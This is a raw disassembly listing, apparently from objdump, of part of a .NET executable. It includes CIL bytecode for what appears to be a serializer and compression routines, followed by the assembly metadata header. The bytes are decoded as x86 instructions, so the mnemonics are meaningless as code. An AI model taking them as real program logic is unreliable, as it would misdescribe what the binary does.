  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	24 27                	and    $0x27,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 4c 45 00          	add    %cl,0x0(%ebp,%eax,2)
  405a37:	00 34 28             	add    %dh,(%eax,%ebp,1)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 80 6d 00 00 10    	add    %al,0x1000006d(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 90 6d 00 00 40    	add    %dl,0x4000006d(%eax)
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	d7                   	xlat   %ds:(%ebx)
  405adb:	04 01                	add    $0x1,%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 42 21             	add    %al,0x21(%edx)
  405ae6:	78 18                	js     0x405b00
  405ae8:	0a 00                	or     (%eax),%al
  405aea:	4c                   	dec    %esp
  405aeb:	00 16                	add    %dl,(%esi)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	7b 21                	jnp    0x405b13
  405af2:	92                   	xchg   %eax,%edx
  405af3:	20 0a                	and    %cl,(%edx)
  405af5:	00 2c 18             	add    %ch,(%eax,%ebx,1)
  405af8:	88 26                	mov    %ah,(%esi)
  405afa:	06                   	push   %es
  405afb:	00 68 1d             	add    %ch,0x1d(%eax)
  405afe:	e8 13 06 00 af       	call   0xaf406116
  405b03:	10 16                	adc    %dl,(%esi)
  405b05:	1f                   	pop    %ds
  405b06:	0a 00                	or     (%eax),%al
  405b08:	34 19                	xor    $0x19,%al
  405b0a:	16                   	push   %ss
  405b0b:	1f                   	pop    %ds
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	5b                   	pop    %ebx
  405b0f:	20 88 26 06 00 c8    	and    %cl,-0x37fff9da(%eax)
  405b15:	21 78 18             	and    %edi,0x18(%eax)
  405b18:	0e                   	push   %cs
  405b19:	00 98 1a 24 14 0e    	add    %bl,0xe14241a(%eax)
  405b1f:	00 03                	add    %al,(%ebx)
  405b21:	21 24 14             	and    %esp,(%esp,%edx,1)
  405b24:	06                   	push   %es
  405b25:	00 3a                	add    %bh,(%edx)
  405b27:	25 e8 13 06 00       	and    $0x613e8,%eax
  405b2c:	c7                   	(bad)
  405b2d:	1c 5a                	sbb    $0x5a,%al
  405b2f:	23 06                	and    (%esi),%eax
  405b31:	00 dd                	add    %bl,%ch
  405b33:	18 78 18             	sbb    %bh,0x18(%eax)
  405b36:	0a 00                	or     (%eax),%al
  405b38:	9f                   	lahf
  405b39:	1f                   	pop    %ds
  405b3a:	2b 00                	sub    (%eax),%eax
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	e2 0a                	loop   0x405b4c
  405b42:	12 00                	adc    (%eax),%al
  405b44:	19 00                	sbb    %eax,(%eax)
  405b46:	ae                   	scas   %es:(%edi),%al
  405b47:	1e                   	push   %ds
  405b48:	12 00                	adc    (%eax),%al
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	78 18                	js     0x405b66
  405b4e:	12 00                	adc    (%eax),%al
  405b50:	e5 10                	in     $0x10,%eax
  405b52:	ae                   	scas   %es:(%edi),%al
  405b53:	1e                   	push   %ds
  405b54:	06                   	push   %es
  405b55:	00 33                	add    %dh,(%ebx)
  405b57:	10 78 18             	adc    %bh,0x18(%eax)
  405b5a:	06                   	push   %es
  405b5b:	00 17                	add    %dl,(%edi)
  405b5d:	14 5a                	adc    $0x5a,%al
  405b5f:	23 06                	and    (%esi),%eax
  405b61:	00 b5 1d 09 20 06    	add    %dh,0x620091d(%ebp)
  405b67:	00 68 0e             	add    %ch,0xe(%eax)
  405b6a:	09 20                	or     %esp,(%eax)
  405b6c:	06                   	push   %es
  405b6d:	00 54 18 dc          	add    %dl,-0x24(%eax,%ebx,1)
  405b71:	05 06 00 f2 11       	add    $0x11f20006,%eax
  405b76:	ae                   	scas   %es:(%edi),%al
  405b77:	1e                   	push   %ds
  405b78:	06                   	push   %es
  405b79:	00 5f 12             	add    %bl,0x12(%edi)
  405b7c:	ae                   	scas   %es:(%edi),%al
  405b7d:	1e                   	push   %ds
  405b7e:	06                   	push   %es
  405b7f:	00 0f                	add    %cl,(%edi)
  405b81:	11 4f 1e             	adc    %ecx,0x1e(%edi)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 ce                	add    %cl,%dh
  405b87:	1e                   	push   %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 37                	add    %dh,(%edi)
  405b8d:	11 ca                	adc    %ecx,%edx
  405b8f:	19 06                	sbb    %eax,(%esi)
  405b91:	00 be 11 ca 19 06    	add    %bh,0x619ca11(%esi)
  405b97:	00 9f 11 ca 19 06    	add    %bl,0x619ca11(%edi)
  405b9d:	00 46 12             	add    %al,0x12(%esi)
  405ba0:	ca 19 06             	lret   $0x619
  405ba3:	00 12                	add    %dl,(%edx)
  405ba5:	12 ca                	adc    %dl,%cl
  405ba7:	19 06                	sbb    %eax,(%esi)
  405ba9:	00 2b                	add    %ch,(%ebx)
  405bab:	12 ca                	adc    %dl,%cl
  405bad:	19 06                	sbb    %eax,(%esi)
  405baf:	00 4e 11             	add    %cl,0x11(%esi)
  405bb2:	ca 19 06             	lret   $0x619
  405bb5:	00 82 11 ca 19 06    	add    %al,0x619ca11(%edx)
  405bbb:	00 69 11             	add    %ch,0x11(%ecx)
  405bbe:	3b 14 06             	cmp    (%esi,%eax,1),%edx
  405bc1:	00 23                	add    %ah,(%ebx)
  405bc3:	11 8f 1e 06 00 f4    	adc    %ecx,-0xbfff9e2(%edi)
  405bc9:	10 ae 1e 06 00 db    	adc    %ch,-0x24fff9e2(%esi)
  405bcf:	11 ca                	adc    %ecx,%edx
  405bd1:	19 06                	sbb    %eax,(%esi)
  405bd3:	00 96 0b e8 13 06    	add    %dl,0x613e80b(%esi)
  405bd9:	00 01                	add    %al,(%ecx)
  405bdb:	23 78 18             	and    0x18(%eax),%edi
  405bde:	06                   	push   %es
  405bdf:	00 4f 22             	add    %cl,0x22(%edi)
  405be2:	78 18                	js     0x405bfc
  405be4:	06                   	push   %es
  405be5:	00 1b                	add    %bl,(%ebx)
  405be7:	14 5a                	adc    $0x5a,%al
  405be9:	23 0a                	and    (%edx),%ecx
  405beb:	00 dd                	add    %bl,%ch
  405bed:	25 16 1f 06 00       	and    $0x61f16,%eax
  405bf2:	92                   	xchg   %eax,%edx
  405bf3:	18 f3                	sbb    %dh,%bl
  405bf5:	25 06 00 95 1c       	and    $0x1c950006,%eax
  405bfa:	f3 25 06 00 c9 13    	repz and $0x13c90006,%eax
  405c00:	f3 25 06 00 53 1a    	repz and $0x1a530006,%eax
  405c06:	78 18                	js     0x405c20
  405c08:	0a 00                	or     (%eax),%al
  405c0a:	88 20                	mov    %ah,(%eax)
  405c0c:	69 21 0a 00 e6 21    	imul   $0x21e6000a,(%ecx),%esp
  405c12:	69 21 0a 00 44 17    	imul   $0x1744000a,(%ecx),%esp
  405c18:	69 21 0a 00 19 26    	imul   $0x2619000a,(%ecx),%esp
  405c1e:	92                   	xchg   %eax,%edx
  405c1f:	20 0a                	and    %cl,(%edx)
  405c21:	00 52 10             	add    %dl,0x10(%edx)
  405c24:	92                   	xchg   %eax,%edx
  405c25:	20 0a                	and    %cl,(%edx)
  405c27:	00 3d 10 92 20 06    	add    %bh,0x6209210
  405c2d:	00 aa 14 78 18 06    	add    %ch,0x6187814(%edx)
  405c33:	00 5a 1c             	add    %bl,0x1c(%edx)
  405c36:	78 18                	js     0x405c50
  405c38:	06                   	push   %es
  405c39:	00 c5                	add    %al,%ch
  405c3b:	18 78 18             	sbb    %bh,0x18(%eax)
  405c3e:	0a 00                	or     (%eax),%al
  405c40:	fc                   	cld
  405c41:	1f                   	pop    %ds
  405c42:	69 21 0a 00 b6 1f    	imul   $0x1fb6000a,(%ecx),%esp
  405c48:	69 21 06 00 1c 20    	imul   $0x201c0006,(%ecx),%esp
  405c4e:	78 18                	js     0x405c68
  405c50:	06                   	push   %es
  405c51:	00 74 0e 78          	add    %dh,0x78(%esi,%ecx,1)
  405c55:	18 0a                	sbb    %cl,(%edx)
  405c57:	00 1e                	add    %bl,(%esi)
  405c59:	18 92 20 0a 00 89    	sbb    %dl,-0x76fff5e0(%edx)
  405c5f:	16                   	push   %ss
  405c60:	88 26                	mov    %ah,(%esi)
  405c62:	0a 00                	or     (%eax),%al
  405c64:	b6 22                	mov    $0x22,%dh
  405c66:	69 21 0a 00 dc 19    	imul   $0x19dc000a,(%ecx),%esp
  405c6c:	16                   	push   %ss
  405c6d:	1f                   	pop    %ds
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	da 1f                	ficompl (%edi)
  405c72:	ab                   	stos   %eax,%es:(%edi)
  405c73:	19 06                	sbb    %eax,(%esi)
  405c75:	00 9f 12 78 18 06    	add    %bl,0x6187812(%edi)
  405c7b:	00 ad 16 e8 13 06    	add    %ch,0x613e816(%ebp)
  405c81:	00 7b 16             	add    %bh,0x16(%ebx)
  405c84:	78 18                	js     0x405c9e
  405c86:	0a 00                	or     (%eax),%al
  405c88:	e6 15                	out    %al,$0x15
  405c8a:	78 18                	js     0x405ca4
  405c8c:	0a 00                	or     (%eax),%al
  405c8e:	1f                   	pop    %ds
  405c8f:	10 78 18             	adc    %bh,0x18(%eax)
  405c92:	06                   	push   %es
  405c93:	00 a0 1d 78 18 06    	add    %ah,0x618781d(%eax)
  405c99:	00 e8                	add    %ch,%al
  405c9b:	22 e8                	and    %al,%ch
  405c9d:	13 06                	adc    (%esi),%eax
  405c9f:	00 4e 18             	add    %cl,0x18(%esi)
  405ca2:	dc 05 06 00 20 1e    	faddl  0x1e200006
  405ca8:	e8 13 0a 00 39       	call   0x394066c0
  405cad:	0e                   	push   %cs
  405cae:	92                   	xchg   %eax,%edx
  405caf:	20 06                	and    %al,(%esi)
  405cb1:	00 32                	add    %dh,(%edx)
  405cb3:	01 78 18             	add    %edi,0x18(%eax)
  405cb6:	06                   	push   %es
